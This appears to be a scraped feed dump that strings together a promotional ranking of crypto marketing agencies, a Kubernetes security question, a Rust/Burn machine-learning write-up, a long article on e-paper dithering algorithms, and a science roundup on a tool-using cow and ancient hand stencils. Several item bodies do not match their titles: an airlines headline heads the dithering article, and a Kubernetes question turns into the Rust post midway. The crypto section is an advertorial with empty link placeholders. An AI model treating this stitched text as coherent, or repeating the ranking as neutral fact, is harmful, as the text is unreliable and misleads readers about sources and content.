Agencies that specialize in one lane can be excellent, but most buyers need at least three pillars at once: credibility, reach, and conversion support. The ranking reflects that real buying behavior.Top Crypto Marketing Agencies Worldwide| Rank | Agency | Best For | Why It Makes The List |
|----|----|----|----|
| 1 | CryptoVirally | Full-funnel growth: PR, KOLs, billboards, viral campaigns | Transparent packages, fast execution, broad service stack, strong trust signals |
| 2 | Coinbound | Influencer-led growth | Strong creator network and social distribution |
| 3 | MarketAcross | PR and thought leadership | PR-first positioning and media operations |
| 4 | NinjaPromo | Full-service digital marketing | Multi-channel delivery across content, social, and creative |
| 5 | ICODA | Strategy plus execution | Full-stack services with performance focus |
| 6 | Blockwiz | Performance marketing | Paid growth and analytics-driven optimization |
| 7 | Lunar Strategy | Web3 growth strategy | Positioning support and growth programs for Web3 brands |
| 8 | GuerrillaBuzz | Community plus content | Community-first execution with organic growth emphasis |
| 9 | CryptoPR | Press release distribution | PR distribution orientation and syndication |
| 10 | Blockchain-Ads | Web3 advertising placements | Crypto-native ad buying and publisher access |Why CryptoVirally Ranks #1 WorldwideCryptoVirally ranks first because it solves the buyer’s problem end-to-end. Many agencies excel in one lane, but most teams need PR plus KOLs plus distribution inside the same launch window. CryptoVirally offers a large catalog of ready-to-buy services, which removes negotiation friction and turns planning into execution faster. That operating model is a competitive advantage when a team needs results in days, not months.CryptoVirally also stands out for transparent service pages and clear deliverables. In an industry where many providers rely on custom quotes and vague scope, fixed packages can protect a budget and reduce delays. The agency also shows public trust signals, including a strong Trustpilot profile with detailed client feedback:. For high-intent buyers, clarity plus proof is often the difference between buying now and continuing to shop.The “Layered Launch” Approach That ConvertsA launch that converts usually stacks credibility, social proof, and amplification. PR creates legitimacy, KOLs create attention and trust transfer, and amplification expands distribution beyond the first wave. When these layers run separately, they often underperform because the story fragments and timing slips. When they run as one plan, the same message travels further and converts better.CryptoVirally’s service stack is built for that layered model. It combines PR distribution, influencer execution, and viral amplification inside a single operational framework. It also supports high-status placements like billboards, which can boost perceived legitimacy when timed around real milestones. Buyers looking for a single partner to coordinate the full funnel usually find this structure more efficient.PR Distribution That Works As A Funnel AssetPress releases are not valuable because they exist, they are valuable because they move the narrative and send qualified traffic. CryptoVirally offers PR distribution options with packages and deliverables visible up front: . That transparency helps teams budget quickly and align scope with the moment, whether it is a listing, a mainnet milestone, or a funding announcement. When PR is paired with follow-up content and social sequencing, it becomes a conversion asset, not just a headline.A buyer should also evaluate what happens after publication. Does the agency support amplification, repurposing, and retargeting around the announcement window. Does it provide reporting that shows referral traffic and conversion lift. CryptoVirally’s packaging makes it easier to design that post-PR plan without starting from zero. That is one reason it ranks higher than PR-only providers.KOL And Influencer Campaigns With Real DistributionInfluencers still drive a disproportionate share of attention in crypto. However, results depend on creator fit, message control, timing, and the landing experience after the click. CryptoVirally runs influencer and KOL execution across major platforms, including X, Telegram, and YouTube:. That cross-platform coverage matters because buyers rarely want exposure in one channel only.A strong KOL program also needs a sequencing plan. It should introduce the story, reinforce credibility, and then push a clear call to action. Buyers should ask how an agency handles coordination and reporting, not just creator lists. The goal is not “a post,” it is a measurable lift in qualified traffic and community behavior.Viral Amplification With Defined DeliverablesViral marketing is where many buyers waste money, because the market is full of vague promises. CryptoVirally offers structured distribution services designed to amplify launches through multiple communities and social channels: . The difference is deliverables and reporting, because vague deliverables usually hide weak execution. When amplification is planned properly, it extends the life of a launch instead of creating a one-hour spike.Viral campaigns also convert better when the foundation is ready. That includes a clean landing page, a clear narrative, and proof elements like audits, partners, or early traction. Without those components, even large reach can fail to convert. Buyers should treat virality as a multiplier, not a substitute for credibility. CryptoVirally’s stack makes it easier to build that multiplier into a full plan.Digital Billboards As A Status And Trust AcceleratorBillboards are a high-status tactic that can still outperform expectations when used correctly. CryptoVirally supports billboard campaigns that can be aligned with milestones, events, or exchange moments: . This matters because offline placements can add perceived legitimacy in a market where many projects look similar. A billboard also creates content that can be repurposed across social, PR follow-ups, and partner outreach.The billboard should not be treated as the strategy. It should be treated as a credibility spike inside a larger funnel that includes PR, KOLs, and timed distribution. When the online and offline storylines reinforce each other, the combined effect tends to be stronger. That is why billboard execution is listed here as part of a layered launch approach.Where The Other Top Agencies FitCoinbound is best known for influencer-first execution and creator-led distribution. It often appeals to brands that already have a strong story and want to push reach quickly through trusted personalities. That specialization can work well, but many teams still need PR and conversion support beyond influencer placements. Official site: .MarketAcross is commonly positioned as a PR-first agency with strong messaging and media execution. It can be a fit for teams that want long-form thought leadership and a heavy media pipeline as the main growth driver. Projects that need broader distribution may still want additional layers beyond PR. Official site: .NinjaPromo operates as a broader marketing agency with multi-channel delivery. It is often considered for social, content, and creative support under one umbrella. Larger agencies can be effective, but buyers should confirm timelines, reporting depth, and execution ownership. Official site: .ICODA markets itself as a full-stack partner with strategic support across channels. It can be suitable for teams that want both planning and execution across growth programs. Buyers should compare transparency of deliverables and speed of rollout across agencies. Official site: .Blockwiz tends to lean into performance marketing and data-driven optimization. It can be a fit when paid acquisition and measurable attribution are the main priorities. Teams should confirm that paid growth is backed by strong creative and landing-page readiness. Official site: .Lunar Strategy is recognized for growth strategy and positioning work for Web3 brands. It can be useful for teams that need sharper messaging and a structured go-to-market plan. Strategy works best when paired with distribution capacity and operational speed. Official site: .GuerrillaBuzz focuses heavily on community, content, and organic growth strategies. It can be a fit for teams that want to build durable community signals and content engines. Buyers should still map organic growth into a measurable funnel with clear outcomes. Official site: .CryptoPR is a recognizable option for press release distribution. It tends to appeal to teams that want PR syndication as a standalone tactic. Buyers should check how PR integrates into social distribution and conversion steps after publication. Official site: .Blockchain-Ads is known for crypto-native advertising placements and media buying. It can be useful when paid placements and publisher access are the primary goal. Buyers should confirm targeting, reporting, and how placements connect to landing-page conversion. Official site: .Buyer Checklist: How To Choose Fast Without RegretsA buyer should start with the outcome, not the tactic. If the goal is credibility, the agency must prove consistent PR execution and show what happens after publication. If the goal is distribution, the agency must coordinate KOL sequencing and amplification windows. If the goal is growth, the partner must map attention into funnel actions, not just impressions.A practical checklist helps buyers cut through marketing speak:Clear deliverables, clear timelines, and clear reportingProof signals: independent reviews, public footprint, and repeatable case examplesAbility to execute PR, KOLs, and distribution as one coordinated planGlobal coverage and localization capability when targeting multiple regionsA post-launch plan, not just “launch day” activity \n  \n One mistake is paying for “guaranteed hype” without measurable deliverables and reporting. Another is buying exposure that does not match the project’s target user, which leads to vanity metrics and weak conversion. Teams also run PR without a distribution plan, then wonder why the announcement did not translate into users. A buyer should require clarity on scope, audience fit, reporting, and the post-publication funnel.Another common mistake is spreading budget across too many disconnected vendors. When PR, KOLs, and amplification are handled separately, timelines drift and messaging breaks. That creates inconsistent narratives and weak conversion, even if each vendor performs “fine” in isolation. Coordination is a hidden ROI lever, and buyers should price it into their decision. CryptoVirally ranks high partly because coordination is built into the service model.Real-World Scenario With KPIsA Web3 infrastructure project plans a major milestone announcement with a 14-day window. The team needs credibility, wallet installs, and stronger share of voice on X during the milestone week. They also want global reach because users and investors are distributed across regions. In that situation, the partner must deliver fast while keeping execution coherent.A coordinated plan typically stacks PR distribution, timed KOL support, and a short amplification window, with creative and landing pages prepared in advance. A billboard can be added for status and event visibility when it supports the narrative and timing. KPIs can include PR pickup count, referral sessions, conversion lift on the landing page, community growth quality, and share of voice during the milestone day. Benchmarks vary by category and market, and no KPI is guaranteed, so measurement and iteration matter.What is the best crypto marketing agency worldwide?The best choice is the partner that combines trust, multi-channel execution, and fast delivery. Many agencies are strong in one area, but most launches require PR, KOLs, and distribution in a coordinated plan. CryptoVirally ranks highest here because it offers a full-stack catalog, transparent packages, and strong trust signals. That combination reduces buyer risk and improves execution speed.How much does a crypto press release cost?Pricing depends on outlet tier, region, and distribution depth. Some agencies provide quotes only after calls, which slows budgeting for fast-moving teams. CryptoVirally lists PR distribution options publicly, which helps teams align scope to budget without delays. Buyers should compare what is included, how reporting works, and what happens after publication.Do agencies provide KOL and influencer marketing?Yes, but execution quality varies widely across providers. Strong programs include creator fit, messaging guardrails, timing, and reporting that ties to funnel actions. CryptoVirally offers influencer execution across major platforms, which can be bundled with PR and amplification for coordinated launches. Buyers should ask how content sequencing and landing-page conversion are handled.Are digital billboards worth it for crypto?Billboards can work well for status, event visibility, and attention spikes when paired with PR and social campaigns. The billboard should support a credible story that already exists, not replace it. The strongest use cases involve clear timing, a recognizable milestone, and follow-up distribution online. That is why billboards often perform best inside a layered launch plan.Crypto marketing is not just noise. It is a trusted distribution with a clear path from attention to action. For most Web3 teams, the best partner is the one that can run PR, influencers, community growth, and amplification together, while keeping scope and reporting clear. That is why CryptoVirally ranks #1 worldwide in this list.A practical next step is to start with PR, add a KOL layer, and run a 14 to 30-day plan with measurable reporting. Teams that execute consistently tend to compound credibility and distribution over time. ]]></content:encoded></item><item><title>How do you handle security scanning for ephemeral workloads and init containers?</title><link>https://www.reddit.com/r/kubernetes/comments/1qlpfj5/how_do_you_handle_security_scanning_for_ephemeral/</link><author>/u/No_Opinion9882</author><category>reddit</category><pubDate>Sat, 24 Jan 2026 15:11:56 +0000</pubDate><source url="https://www.reddit.com/r/kubernetes/top/?sort=top&amp;t=day&amp;limit=6">Kubernetes</source><content:encoded><![CDATA[Hey everyone, been running into a headache with our security posture on k8s. Our current SAST/SCA tools scan images fine during CI, but we're blind to what's actually vulnerable in runtime. The issue: We have tons of init containers, sidecar proxies, and ephemeral jobs that spin up and down. Some pull images we've never scanned, others run with elevated privileges we didn't account for during static analysis.

PyTorch was a non-starter: 7GB dependencies, 3s cold start, installation hell. Burn compiles to a single binary and targets wgpu (native GPU), ndarray (CPU), and WASM (browser) from one codebase. The CNN is pretty standard, but Burn's derive macros make it clean: #[derive(Module, Debug)] pub struct PlantClassifier<B: Backend> { conv1: ConvBlock<B>, conv2: ConvBlock<B>, conv3: ConvBlock<B>, conv4: ConvBlock<B>, global_pool: AdaptiveAvgPool2d, fc1: Linear<B>, dropout: Dropout, fc2: Linear<B>, }4 conv blocks (32→64→128→256), BatchNorm + ReLU, GlobalAvgPool, then FC layers. The  macro handles all the weight serialization and device placement automatically.The Semi-Supervised Learning PartLabeled agricultural data is expensive (~€2/image for expert annotation). We used pseudo-labeling with a configurable confidence threshold: #[derive(Debug, Clone, Serialize, Deserialize)] pub struct PseudoLabelConfig { pub confidence_threshold: f64, // Default: 0.9 pub max_per_class: Option<usize>, // Prevent class imbalance pub retrain_threshold: usize, // Min samples before retrain pub curriculum_learning: bool, // Start strict, relax over time }Train on 30% labeled → predict on 70% unlabeled → accept predictions >90% confidence → retrain. Result: accuracy comparable to 60% fully-labeled.This was the fun part. Tauri 2.0 wraps the Burn model in a native iOS app: cargo tauri ios build 80ms inference on the A14 chip. The Rust backend does all the ML, the UI is just HTML/JS. It's actually running Rust on an iPhone. - Burn is genuinely production-ready for inference workloads -  with the  release has solid CUDA 13 support - WASM performance is better than expected (~80ms on mobile Safari) - Compile times are... Rust compile times.  +  = 5+ min release builds - Tauri mobile is legit - one codebase, native perf]]></content:encoded></item><item><title>These Are the Best and Worst Airlines of 2025</title><link>https://www.youtube.com/shorts/sP2m1JaCPv4</link><author>The Wall Street Journal</author><category>yt</category><enclosure url="https://www.youtube.com/v/sP2m1JaCPv4?version=3" length="" type=""/><pubDate>Sat, 24 Jan 2026 15:01:27 +0000</pubDate><source url="https://www.youtube.com/channel/UCK7tptUDHh-RYDsdxO1-5QQ">The Wall Street Journal</source><content:encoded><![CDATA[This year’s winner has spent billions improving its operations—while navigating a corporate shake-up and revamping its strategy.⁠

The classic one that most people think about is only black and white. However most newer panels are at least capable of greyscale, and the best in class are colour. But the colour and greyscale isn’t “true” colour and greyscale, but rather they have a set of greyscale levels or a small set of colours they can display. Some digital signage variants have black, white, and one or two contrast colours, other variants like the ones found in e-book readers either have a set of colours they can display, or fairly low-fidelity RGB (compared to normal screens). The panel I’ve chosen for this project is black and white and capable of 16 levels of greyscale. Part of the reason for this choice was of course availability at the time, but also that epaper panels with colour is considerably slower and often offers lower contrast. The panel I’ve chosen can be driven very quickly in black and white mode, and slower in greyscale mode. This means that there’s a trade-off to be made about speed and graphical fidelity. Use cases such as e-book readers or picture frames typically trade for graphical fidelity. If you’re going to spend a minute to read a page of text you don’t care about a couple extra tenths of milliseconds to render it nice and crisp. And if you are updating a picture that will stay on a wall potentially for days you don’t care about a couple seconds of refresh time. Making these trade-offs require that you have the ability to reason about the usage patterns of the underlying system so that you’re able to design around the limitations you choose. For a general purpose computer which more often than not will run software that isn’t optimised for epaper I considered speed to be more important. In this article I will discuss a lot of various dithering algorithm, unfortunately the article would be twice as long if I went into detail about every single one. If you want to know more about many of these algorithms I recommend Image Dithering: Eleven Algorithms and Source Code by Tanner Helland as a good starting point. After that you should be able to keep up, albeit with some occasional Googling to look up specifics on the algorithms he don’t mention. I go into the basic concept of the various methods however, so you should be fine reading this as a stand-alone article as well.For maximum speed we’re stuck with only using black and white, and even if we wanted to implement a full-fidelity mode we would be stuck with only 16 levels of greyscale. And this is where dithering comes in. The most naïve way to turn an image into only black and white would be to apply a simple threshold, any pixel darker than half grey would appear black, and any pixel brighter would appear white:As you can see this doesn’t look particularly good, we are able to make out the subject, but a lot of detail is understandably lost. However if we apply some dithering we trick our brains into seeing more details:This image is still only composed of black and white pixels, but now the density of the black pixels makes our brain think there are more levels of greyscale than what is actually there.Going into this project I thought that dithering would be one of the simple parts, after all dithering has been used for ages to improve graphical fidelity in systems with limited palettes. So we could simply pick whatever is the “best” dithering algorithm and off we go! Unfortunately this wasn’t the case. Many of the reasons seems to stem from when these approaches where made and the hardware they where made for, but some of them are more technical in nature. One of these historical issues is that these algorithms were mostly designed to display images on black and white screens in an otherwise controlled environment. So all the menus, windows and buttons would be carefully hand drawn, and the dithering algorithm would only be called upon to show images. This means that a lot of dither algorithm evaluation and comparison is done on simple images like the ones shown so far in this article. This isn’t the system we will be using the algorithm in however. Of course I’ll carefully set up the theme and icons to work well on the display. But what other programs, and maybe especially the web, does is out of my control. Therefore I’ve constructed a test image which I’ll use throughout this article which combines an image, some gradients, some solid coloured blocks, and some text on various backgrounds:To simulate text that could be found in actual interfaces the “Hello” words are either completely black or completely white, and the “world” words are set with a colour selected to be the lowest possible level of contrast that still achieved “good” on Coolors contrast checker. We’re unfortunately not always so lucky as to have “good” contrast in UIs and on the web nowadays, but if a designer actually chose a good contrast we should try to render it well.The trouble with error-diffusionThe dithering algorithm used in the example above is a fairly classic algorithm called Floyd-Steinberg. Here it is again on my test image:Floyd-Steinberg is a so called error-diffusion algorithm that works by going through all the pixels from the top left and as pixels are quantised to black or white it spreads the error of the quantisation to nearby pixels. It’s a bit hard to explain without a visual aid, so I made this:As you can see the pixels are processed from the top left going left to right (in grey), then the pixel currently being processed (in dark red) spreads the error out to nearby pixels. There are multiple of these algorithms with different ways to spread the error which I’ve also included in the image. So Atkinson dithering spreads the error to the same pixels as Floyd-Steinberg, but also two extra pixels. And Jarvis, Judice, and Ninke spreads it out to a whole lot more pixels. The error also isn’t spread out evenly, and in the case of the Atkinson dither not all of the error is spread out.When processing a pixel the original colour of the pixel is added together with the error and the result is quantised. This leads to an image where shades of grey are smoothed out nicely, and sharp edges still retain a hard contrast. It is also quite a fast approach for linear computation, i.e. running on a CPU, processing one pixel at a time. But if you want to parallelize it you run into issues with pixels being dependent on the result of the pixels that come before them in the image. Change the top left pixel and you risk having your entire image change. This is no good when we want to compute multiple pixels simultaneously.Another issue is that things like moving the mouse or a blinking cursor could cause a lot of changes in the output image because the change in error propagates through the image. These two pictures look almost identical to us, the only difference in the input image is that the cursor moved one pixel to the right and down, but on the right you can see the difference in the Floyd-Steinberg output:This would be noticeable enough as flickering pixels on a normal display, but when you factor in the slight ghosting of an epaper screen you end up with a persistent grey “lightning” across the screen. With this ghosting the difference in the third image would be clearly visible on the screen even after the movement stopped.The underlying problem, which I’ll call the dependency problem as it is caused by pixels being dependent on the output of previous pixels, is present in all Floyd-Steinberg style algorithms. And there are quite a few of these, after all they are typically the kind of algorithm which produces the best visual results. In terms of the dependency problem there are some slight differences though. Jarvis, Judice & Ninke is more affected because it spreads error to more pixels; Atkinson is slightly better because it “loses” error; and Riersma, which diffuses error along a Hilbert curve instead of out from the top left, is slightly less affected but performs worse in general and is even harder to parallelize. The dependency problem is the first of the technical issues, and maybe the most critical one.Another issue with these algorithms is what I call the warm-up problem. Since the algorithm works by “pushing” error ahead of the processed pixel there are cases where the context stored in this error doesn’t match the current part of the image. If you look at the top left of the sample image you can see that the area of white pixels almost have a rounded appearance. The gradient in the source image is completely linear and this effect is simply caused by the algorithm not having any error context to pull from for these pixels. This means that until sufficient error is accumulated the algorithm doesn’t know what to do. There is a similar phenomenon whenever the image switches context, most visibly in this image in the first grey block on the bottom next to the completely black one. The image above is bright, and with the sudden change to dark grey the top-right row of pixels end up completely black creating a visible artefact.These might seem like nitpick on an otherwise great algorithm, but both these problems are caused by a general dependency of context. In addition to being bad for parallelization this causes another problem. Since epaper panels are static once they are updated many of them support partial updates meaning that only the area of the screen where something changed will be updated. This saves a lot of power and one of the major goals of an epaper laptop would be great battery life. In addition to saving power it also means spending less time on each update, which directly impacts input latency. So we definitely want to take advantage of partial screen updates! With an error diffusion algorithm it is much harder to perform these partial updates because in order to dither a small region of the image not only must we have the context for the part we want to update, but we also need to potentially update everything below/around it.Out of all the algorithms in this category I found Riersma was the most promising in terms of the dependency and warm-up problems, but it is very hard to parallelize and do partial updates with. Jarvis, Judice & Ninke might perform a hair better than Floyd-Steinberg in graphical fidelity (especially in some edge cases with light gradients). Atkinson dithering looses a bit of error as it goes along, effectively changing the contrast of the image slightly while easing some of the dependency problem. But all of these suffers from the “lighting strike” effect whenever pixels are updated, so for the general part of the renderer they aren’t a good match. And while they are easier to parallelize than Riersma they’re still not great. I’ll keep them around for high-fidelity modes though as there are use cases where I want to look at static images and they still produce the best results, especially for the 16 shades of grey mode which is already slow enough that you wouldn’t want to use it for much else anyways.Fortunately error-diffusion isn’t the only thing that can be used to dither an image. Imagine we want to turn an image composed of a single shade of grey into a dithered version. If the shade is about 30% black then we’d expect 30% of the pixels in the output to be black. The problem is just how we select these 30%. One approach would be to determine the threshold for a pixel to turn black or white depending upon where in the image it is, making sure to pick these thresholds such that they match our intuition about percentages of pixels. This is what’s called ordered dithering, pattern dithering, or positional dithering. A big benefit to not having any context (save for the pattern itself) is that every pixel can be individually processed in parallel on a GPU. On an epaper laptop I assume the GPU will go mostly idle anyways, and since almost all general purpose CPUs nowadays comes with a GPU it would be a shame not to utilise it. For such ordered dithering there are many different patterns we can use, perhaps the most well known being a Bayer matrix. Compared to error-diffusion algorithms though, the result is a bit lacklustre: This doesn’t suffer from the dependency problem, nor the warm-up problem. But we have some new problems, the first of which I call the pattern problem. As you can see the pattern of the dithering mask is clearly visible in this image, which can be quite distracting. The error-diffusion algorithms also suffers from various degrees of the pattern problem, but it’s more obvious here as the Bayer matrix is a very small pattern, so the repetition is clearly visible. An alternative to avoid the obvious patterning is to use a blue noise pattern: Because the “pattern” here is just noise it is no longer as discernible in the output, in this image the pattern is the same size as the image. If you tiled a smaller pattern you could be able to discern some structure, especially in large single colour areas, but a lot of the repetition is hidden by the noise. Since the size of the monitor is known I can easily just create a blue noise pattern for the entire screen, so this test is more realistic. The second problem is what I call the transition problem. Since there is no context from surrounding pixels hard edges are often softened up. Especially the text is harder to read compared error-diffusion dithering because the hard edges are preserved better and even the Bayer matrix performs better because the pattern is much less organic. The boxes around the text and along the bottom also has fuzzier borders, and even Davids sharper features are a bit softened. Applying a different threshold to every pixel like what both the Bayer matrix and blue noise does will indeed give us the right amount of black pixels, but in a way it means that we lose resolution. The sharp transitions from one colour to another doesn’t quite resolve properly and appear noisy in the output image.Another algorithm fitting in with ordered dithering is a dither which uses some simple functions to generate what is effectively a pattern on demand. This is nice if you don’t have memory for the pattern, but for my use case it would probably be faster to use the algorithms to generate a pattern and then do the dithering on the GPU. The visual results are somewhere between Bayer and blue noise, here the 3rd pattern is shown: There is a bit of the patterning problem, although less than with the Bayer matrix. There’s also some of the transition problem, but the increased pattern means it appears less like a blur and more like an artefact for better or worse.I’ve spent a lot of time trying to squeeze more graphical fidelity out of these ordered dithering methods. For example the resolution of the panel I’m using is high enough that a perfect chequerboard looks almost indistinguishable from the 50% grey colour in the 16 colours mode. This means that the Bayer matrix dithering actually looks better on the panel itself than if you’re looking at this on a regular screen. It also means that the blue noise pattern looks slightly worse since it never features this pattern. So I tried to create a hybrid, a blue noise pattern, but reorganised such that it would create chequerboard grey.  It works in the sense that it creates that nice chequerboard for the 50% grey, but it now has some clustering which doesn’t look great. All in all I’d say it’s about par on the real panel, maybe only a touch better. When using methods that feature chequerboard grey, which the Floyd-Steinberg method also does, I’ve found that applying a slight filter that pushes colours towards full black, half grey, and full white will make certain scenes better. Certainly something I will experiment more with in the future.I also tried to use some edge-detection algorithms and use the result of those to influence a blue noise pattern, in this way hoping to get slightly crisper edges while still retaining that organic look.  It does work, but I’ve struggled with tuning all the parameters right to get a good effect. The pattern used for the above image is made by creating an edge-detection of the input manually in GIMP with the “Difference of Gaussians” method which was then level adjusted to be more more black and white. This edge-detection was then used as a mask for a half grey image over the blue noise pattern. A half grey pattern is the same as simple thresholding so essentially this makes it so that hard edges switches to thresholding while the rest is blue noise dithered. The effect is subtle, but it does reduce the transition problem making the text slightly easier to read, and the crispness of Davids features are slightly improved. However these edge-detection algorithms aren’t computationally cheap, and I’m not sure if the juice is worth the squeeze so to say.New GPU-based error diffusion?So error-diffusion creates pretty results but doesn’t really work for this use-case, and the ordered dithering which is easy to use for this use-case suffers quite a bit quality wise. So what can we do, is there some kind of middle ground thing we could use? As I mentioned in the introduction most dithering algorithms where designed a long time ago because they where relevant for monochrome monitors back in the days (or even just limited palette displays). So they are optimised for that era of hardware. Floyd-Steinberg for example touts that it can dither the image in a single forward pass, and the division factors are calculated such that you can do the maths with simple bit shifts. And don’t get me wrong, this is very cool and actually means that you can run these algorithms on a single thread with decent performance. But nowadays we have GPUs that can render realistic lighting at over hundred frames a second. So can we leverage this resource which will mostly be dormant on this machine anyways? Implementing ordered dithering algorithms on the GPU is pretty trivial as each pixel is individually processed. But as I discussed before the normal error-diffusion algorithms are hard to get running with good performance and aren’t all that suited for my use case anyways because of the large updates and ghosting. There have been a little interest in the field of GPU based dithering. Some papers have been written about it, but they are mostly about running existing algorithms on new hardware. There have been a few algorithms built specifically for GPUs, but many of those are simply the same error-diffusion techniques but applied to chunks in various patterns. For example applying Floyd-Steinberg in small circular chunks instead of across the entire image. These do solve the whole image-spanning dependency issues, but the individual chunks still suffer from the warm-up problem which means that they are often very obvious. There are also some great algorithms that do error-diffusion on the GPU but which just simply takes too long, including one paper that touted doing about 4x the resolution I’m looking at in 7.2 seconds using an Nvidia GTX 780Ti. The results look good, but I neither have the horse-power nor the time to use something like that for a real-time system.I tried my hand at creating something myself, inspired by both ordered dithering techniques and error-diffusion algorithms. It is created for GPUs and works by splitting the image into very small chunks (like 3x3 or 5x5), then considering how many black pixels that chunk should contain by the average grey level and placing those pixels on the darkest original pixels while also applying a small bit of noise and diffusing some error to nearby pixels to avoid clustering. The results are decent, words are crisp, and so are Davids features, but you can tell that it is done in chunks and it struggles a bit with hard transitions.It’s not terrible however and the idea of a GPU based dithering algorithm stuck with me. And in my seemingly infinite search for a dithering algorithm that could work I stumbled upon an algorithm called Dizzy Dither. It does error diffusion, and the author compares the result to blue-noise dithering. However in the article introducing the algorithm they only ever test it on a picture. In my benchmark I would actually say that it outperforms blue-noise dithering.  The general organic, noisy feel of blue-noise dithering is still there, but text gets better sharpness, the features of David are made a bit more distinct. On top of that it doesn’t suffer from neither the dependency problem nor the warm-up problem. The way it works is by randomly selecting pixels to dither, diffusing errors to nearby pixels. This means that only some pixels will have error taken into account while dithering, about three quarters in my testing. It also means that error, while it theoretically can traverse the entire image, tends to stay very localized. Doing the same test with the cursors from above we can see this clearly:Since error doesn’t propagate far the dependency problem is much smaller and partial updates can simply be done by just padding the affected region a bit. And since it isn’t troubled by the warm-up problem even not increasing the area will lead to completely passable results. When considering all of this I had an epiphany. If the dependency problem is so small, and many pixels don’t even see any errors before being dithered it should be possible to handle more than one pixel at a time. And sure enough, by creating a pattern consisting of multiple layers of randomly selected pixels until the entire image is filled the algorithm can be run on the GPU! Each layer contains the same amount of pixels, and no two pixels in any given layer can have their error propagation region overlap (otherwise the GPU would try to write to the same memory at the same time for two different pixels). Other than that it’s pretty straight forward, and the visual results are pretty much the same as the single-threaded version. Depending on how big the pattern is you do get some patterning on large fields of single-coloured areas, but by simply improving the randomness of the pattern generation process I hope to be able to fix this.When comparing the speed of these algorithms it really comes down to CPU vs. GPU processing. For example performing Floyd-Steinberg is about 1.9x slower than doing blue noise ordered dithering on the CPU in my naĩve implementation. But performing Dizzy Dither and blue noise dithering (speed on the same order of magnitude) on the GPU is about 280x faster than CPU bound Floyd-Steinberg for an image of the same resolution as the monitor I’m going to use for my project. So dithering on the GPU (or even on specialized hardware) is definitely the way to go for a project like this.As you might have noticed this is something I’ve been thinking about a lot, this might even be my longest article to date. And in fact this isn’t even the first time that I was “done” researching the topic and ready to select an algorithm just to nerd-snipe myself as I was typing up my findings. I’ve done a lot of research into all kinds of different algorithms and implemented a whole lot of them to compare results on the test-image used in this article. What’s presented here is only a small sample of the things I’ve tried and looked into, a lot of the things I looked at where either just dead ends, or weren’t interesting enough to warrant making this article longer. To allow my work to be more easily replicated and improved I will make the code for my algorithm tester available on GitHub if anyone wants to poke around with these algorithms. I believe there are yet some great dithering algorithms to be discovered, and by using GPUs or maybe even NPUs I think we can get good results at great speeds. If anyone ends up developing something interesting in this space, please let me know! But for now I think I will finally close the chapter on dithering. For the epaper laptop I will go for using my GPU implementation of Dizzy Dither for normal usage, and then include other algorithms like Floyd-Steinberg for high-fidelity modes. I will also do some more tricks to improve the actual experience of using the laptop in an upcoming article on writing the driver and integrating the dithering algorithms. Since the entire thing will be running alongside the OS and not simply as some dumb screen we have a lot of options for handling windows, the cursor, and using hotkeys to improve upon common pitfalls of epaper computers, so stay tuned for that!]]></content:encoded></item><item><title>Claude Code&apos;s new hidden feature: Swarms</title><link>https://twitter.com/NicerInPerson/status/2014989679796347375</link><author>AffableSpatula</author><category>hn</category><pubDate>Sat, 24 Jan 2026 14:35:47 +0000</pubDate><source url="https://news.ycombinator.com/best">HN</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>Mercosur talks reveal Europe’s devision | DW News</title><link>https://www.youtube.com/shorts/K6QW8TN0g3c</link><author>DW News</author><category>news</category><enclosure url="https://www.youtube.com/v/K6QW8TN0g3c?version=3" length="" type=""/><pubDate>Sat, 24 Jan 2026 14:15:04 +0000</pubDate><source url="https://www.youtube.com/channel/UCknLrEdhRCp1aegoMqRaCZg">News - DW</source><content:encoded><![CDATA[Watch the entire episode here: https://youtu.be/kKDcHOir-rY

Here are the studies this week that scratched the sweet spot, extended a hand, went over the hill, and ended up on Mercury.First, a clever cow single-hoofedly upends assumptions about bovine intelligence. Next, we’ve got the oldest rock art ever discovered, the graying of modern zoos, and the delightfully named phenomena of bursty bulk flows.Veronika, a Swiss brown cow that lives in a rural mountain village in Austria, is the first cow to demonstrate tool use. How udderly amoosing!Veronkia’s owner Witgar Wiegele, who keeps her as a pet companion, noticed years ago that she likes to pick up sticks with her mouth in order to reach hard-to-scratch places on her body. The hills were soon alive with word of Veronika’s tool-using prowess, attracting the attention of researchers Antonio Osuna-Mascaró and Alice Auersperg of the University of Veterinary Medicine Vienna. Tool use is a sign of advanced cognition that has been observed in many animals, including primates, orcas, and birds. But cows, with their vacant expressions and docile nature, have been overlooked as likely tool users, except as a joke in Gary Larson’scartoons.  In their new study, Osuna-Mascaró and Auersperg presented Veronika with a deck brush, which she proceeded to use as a scratching tool in a variety of configurations.“We hypothesized that she would target difficult-to-reach body regions and use the more effective brushed end over the stick end,” the researchers said. “Veronika’s behavior went beyond these predictions, however, showing versatility, anticipation, and fine motor targeting.” “Unexpectedly and revealingly, Veronika’s tool-end use depended strongly on body region: she predominantly used the brush end for upper-body scratching and the stick end for lower areas, such as the udder and belly skin flaps,” they added. “Importantly, the differential use of both broom ends constitutes the use of a multipurpose tool, exploiting distinct properties of a single object for different functions. Comparable behavior has only been consistently documented in chimpanzees.”I recommend reading the study in full, as it is not very long and contains ample video footage demonstrating Veronika’s mastery of the deck brush. The authors seem genuinely enraptured by her talents and, frankly, it’s hard to blame them for milking the discovery. Overall, the findings serves as a reminder not to cowtow to stereotypes of braindead bovines, a point made by the study’s bullish conclusion:“Despite millennia of domestication for productivity, livestock have been almost entirely excluded from discussions of animal intelligence,” Osuna-Mascaró and Auersperg said. “Veronika’s case challenges this neglect, revealing that technical problem-solving is not confined to large-brained species with manipulative hands or beaks.” “She did not fashion tools like the cow in Gary Larson’s cartoon, but she selected, adjusted, and used one with notable dexterity and flexibility,” they concluded. “Perhaps the real absurdity lies not in imagining a tool-using cow, but in assuming such a thing could never exist.”Now that’s something to ruminate on.Archaeologists have discovered the oldest known rock art, which are very faint hand stencils made by humans 68,000 years ago on a cave wall on the Indonesian island of Sulawesi.For comparison, the next oldest rock art, located in Spain and attributed to Neanderthals, is roughly 66,000 years old. The newly-dated hand stencils were made by a mysterious group of  people who eventually migrated across the lost landmass of Sahul, which is now submerged, and reached Australia.The find supports a “growing view that Sulawesi was host to a vibrant and longstanding artistic culture,” said researchers co-led by Adhi Agus Oktaviana and Budianto Hakim of Indonesia's National Agency for Research and Innovation, and Renaud Joannes-Boyau of Southern Cross University. “The presence of this extremely old art in Sulawesi suggests that the initial peopling of Sahul about 65,000 years involved maritime journeys between Borneo and Papua, a region that remains poorly explored from an archaeological perspective,” the team added.Though the stencils are extremely faint and obscured by younger paintings, it’s still eerie to see the contours of human hands from a long-lost era when dire wolves and Siberian unicorns 